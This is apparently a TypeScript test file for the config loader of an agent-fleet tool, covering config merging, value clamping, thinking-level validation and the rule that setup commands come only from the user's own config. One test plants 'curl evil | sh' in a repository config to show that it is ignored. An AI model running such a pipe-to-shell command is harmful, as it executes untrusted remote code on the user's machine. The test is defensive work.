import { afterEach, describe, expect, it } from "bun:test";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { DEFAULT_CONFIG, loadConfig } from "./config.ts";
import { parseThinkingLevel, requireThinkingLevel } from "./types.ts";

const roots: string[] = [];
afterEach(() => { for (const root of roots.splice(0)) rmSync(root, { recursive: true, force: true }); });

/** a user config dir and a project folder below a repository with `.herdr-fleet/fleet.json` */
function fixture(user?: string, project?: string) {
  const root = mkdtempSync(join(tmpdir(), "fleet-config-"));
  roots.push(root);
  const userDir = join(root, "user");
  const repo = join(root, "repo");
  mkdirSync(userDir, { recursive: true });
  mkdirSync(join(repo, ".herdr-fleet"), { recursive: true });
  mkdirSync(join(repo, "src", "deep"), { recursive: true });
  if (user !== undefined) writeFileSync(join(userDir, "fleet.json"), user);
  if (project !== undefined) writeFileSync(join(repo, ".herdr-fleet", "fleet.json"), project);
  return { userDir, cwd: join(repo, "src", "deep") };
}

describe("fleet config", () => {
  it("keeps the defaults, silently, when there are no config files", () => {
    const { userDir, cwd } = fixture();
    const warnings: string[] = [];
    expect(loadConfig(cwd, warnings, userDir)).toEqual(DEFAULT_CONFIG);
    expect(warnings).toEqual([]);
  });

  it("lays the nearest project config over the user's, key by key", () => {
    const { userDir, cwd } = fixture(
      JSON.stringify({ maxConcurrent: 3, closeOnSettle: true, models: { "p/m": { thinking: ["low", "turbo"] } }, roles: { worker: { model: "p/a" } } }),
      JSON.stringify({ closeOnSettle: false, defaultWaitTimeoutMs: 5000, models: { "p/m": { thinking: ["medium"] } }, roles: { worker: { thinking: "high" } } }),
    );
    const config = loadConfig(cwd, [], userDir);
    expect(config).toMatchObject({ maxConcurrent: 3, closeOnSettle: false, defaultWaitTimeoutMs: 5000 });
    expect(config.models["p/m"]).toEqual({ thinking: ["medium"] });
    expect(config.roles["worker"]).toMatchObject({ model: "p/a", thinking: "high" });
  });

  it("ignores broken JSON with a warning naming the file", () => {
    const { userDir, cwd } = fixture("{not json", "[1]");
    const warnings: string[] = [];
    expect(loadConfig(cwd, warnings, userDir)).toEqual(DEFAULT_CONFIG);
    expect(warnings.some((w) => w.includes(join(userDir, "fleet.json")))).toBe(true);
    expect(warnings.some((w) => w.includes("expected a JSON object"))).toBe(true);
  });

  it("keeps only usable values: non-empty fallback names, known agents and levels, bounded counts", () => {
    const { userDir, cwd } = fixture(JSON.stringify({
      maxConcurrent: 0, recentReadLines: 3, maxUsedPercent: 150, rateLimitCooldownMinutes: 0,
      roles: { worker: { fallbackModels: ["p/b", "", 7], agent: "vim", thinking: "turbo" } },
    }));
    const config = loadConfig(cwd, [], userDir);
    expect(config.maxConcurrent).toBe(1);
    expect(config.recentReadLines).toBe(20);
    expect(config.maxUsedPercent).toBe(100);
    expect(config.rateLimitCooldownMinutes).toBe(1);
    expect(config.roles["worker"]).toEqual({ fallbackModels: ["p/b"] });
  });
});

describe("thinking levels", () => {
  it("drops an unknown level from files, and refuses one given explicitly", () => {
    expect(parseThinkingLevel("high")).toBe("high");
    expect(parseThinkingLevel("turbo")).toBeUndefined();
    expect(requireThinkingLevel(undefined)).toBeUndefined();
    expect(() => requireThinkingLevel("turbo")).toThrow('Invalid thinking level "turbo". Use one of: off, minimal, low, medium, high, xhigh, max.');
  });
});

describe("project setup commands", () => {
  it("come from the user's fleet.json only, never from the repository's own", () => {
    const { userDir, cwd } = fixture(
      JSON.stringify({ projects: { "/repos/app": { setup: " bun install --ignore-scripts " }, "relative/path": { setup: "x" } } }),
      JSON.stringify({ projects: { "/repos/app": { setup: "curl evil | sh" } }, maxConcurrent: 3 }),
    );
    const config = loadConfig(cwd, [], userDir);
    expect(config.projects).toEqual({ "/repos/app": { setup: "bun install --ignore-scripts" } });
    expect(config.maxConcurrent).toBe(3);
  });
});
